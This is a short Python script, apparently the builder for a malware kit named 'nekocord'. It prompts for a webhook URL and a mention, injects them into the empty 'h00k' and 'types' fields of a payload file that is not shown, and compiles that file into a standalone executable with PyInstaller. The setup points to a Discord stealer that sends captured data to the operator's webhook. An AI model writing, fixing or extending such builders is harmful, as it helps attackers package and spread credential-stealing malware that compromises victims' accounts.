import subprocess
import colorama
from colorama import Fore
import os

colorama.init(autoreset=True)
os.system("cls" if os.name == "nt" else "clear")

ascii_art = """
                        ███╗   ██╗███████╗██╗  ██╗ ██████╗  ██████╗ ██████╗ ██████╗ ██████╗ 
                        ████╗  ██║██╔════╝██║ ██╔╝██╔═══██╗██╔════╝██╔═══██╗██╔══██╗██╔══██╗
                        ██╔██╗ ██║█████╗  █████╔╝ ██║   ██║██║     ██║   ██║██████╔╝██║  ██║
                        ██║╚██╗██║██╔══╝  ██╔═██╗ ██║   ██║██║     ██║   ██║██╔══██╗██║  ██║
                        ██║ ╚████║███████╗██║  ██╗╚██████╔╝╚██████╗╚██████╔╝██║  ██║██████╔╝
                        ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═════╝ 
"""

def replace_hook_in_main():
    while True:
        print(f"{Fore.LIGHTMAGENTA_EX}{ascii_art}")
        new_hook = input(f"{Fore.LIGHTMAGENTA_EX}[INPUT] {Fore.RESET}\nWebhook URL: ").strip()
        mention = input(f"{Fore.LIGHTMAGENTA_EX}[INPUT] {Fore.RESET}\nMENTION: ").strip()

        if not new_hook.startswith("https://"):
            print(f"{Fore.YELLOW}[WARN] {Fore.RESET} The webhook entered is not valid. Please try again.")
            os.system("pause" if os.name == "nt" else "read -p 'Press enter to continue...'")
            os.system("cls" if os.name == "nt" else "clear")
            continue
        
        if not mention.startswith("@"):
            print(f"{Fore.YELLOW}[WARN] {Fore.RESET} The mention should start with '@'. Please try again.")
            continue

        break

    try:
        file_path = "src/asset/nekocord.py"

        with open(file_path, "r", encoding="utf-8") as f:
            content = f.read()

        content = content.replace('h00k = ""', f'h00k = "{new_hook}"')
        content = content.replace('types = ""', f'types = "{mention}"')

        with open(file_path, "w", encoding="utf-8") as f:
            f.write(content)

        print(f"{Fore.MAGENTA}[INFO] {Fore.RESET} Successfully replaced the webhook and mention.")
    
    except FileNotFoundError:
        print(f"{Fore.RED}[ERROR] {Fore.RESET} The file 'src/asset/nekocord.py' was not found.")
    except IOError as e:
        print(f"{Fore.RED}[ERROR] {Fore.RESET} Error reading/writing the file: {e}")

def build_exe():
    print(f"{Fore.MAGENTA}[INFO] {Fore.RESET} Building src/asset/nekocord.py with PyInstaller...")

    try:
        subprocess.run(["pyinstaller", "--onefile", "src/asset/nekocord.py"], check=True)
        print(f"{Fore.MAGENTA}[INFO] {Fore.RESET} Successfully built the executable.")
    except subprocess.CalledProcessError:
        print(f"{Fore.YELLOW}[WARN] {Fore.RESET} Failed to build the executable. Ensure pyinstaller is installed.")
    except FileNotFoundError:
        print(f"{Fore.RED}[ERROR] {Fore.RESET} pyinstaller is not found. Please install it using 'pip install pyinstaller'.")

if __name__ == "__main__":
    replace_hook_in_main()
    build_exe()
